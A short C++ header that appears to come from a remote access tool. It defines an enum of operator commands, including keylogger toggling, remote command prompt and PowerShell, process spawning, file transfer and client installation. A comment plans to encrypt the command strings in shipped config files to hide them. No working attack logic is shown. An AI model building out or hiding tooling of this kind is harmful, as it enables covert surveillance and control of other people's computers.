#pragma once
/*
* This is essentially the core of
* the cmdhandler class.
*
* It's all based around the idea of
* using a vector of data that maps
* an int and a string together.
*
* The only reason why it doesn't use
* a map is because it needs the id associated
* with the command as well.
*
* Dealing with strings is the last thing I'd want to do
* so I'll remove the vector containing all the commands
* in plain text from final builds of the program.
*
* Sending out only config files with encrypted cmds
* will work and decrypting them on runtime will help.
*/

enum AppCmds
{
	DisableAll		 = 0x01,
	ToggleKeylogger	 = 0x02,
	RemoteCmdPrompt	 = 0x03,
	RemotePws32		 = 0x04,
	RemotePws64		 = 0x05,
	SpawnRemoteProc	 = 0x06,
	KillClient		 = 0x07,
	RestartClientCmd = 0x08,
	ListClients		 = 0x09,
	ConnectToClient	 = 0x0A,
	SwitchSessionCmd = 0x0B,
	ExitSessionCmd	 = 0x0C,
	DisconnectClient = 0x0D,
	CloseAppCommand	 = 0x0E,
	DownloadFileCmd	 = 0x0F,
	UploadFileCmd	 = 0x10,
	BroadCastToAll	 = 0x11,
	InstallClient	 = 0x12,
	Help			 = 0x13,
	ToggleKeyboard	 = 0x14,
	InvalidClientCmd = (-1)
};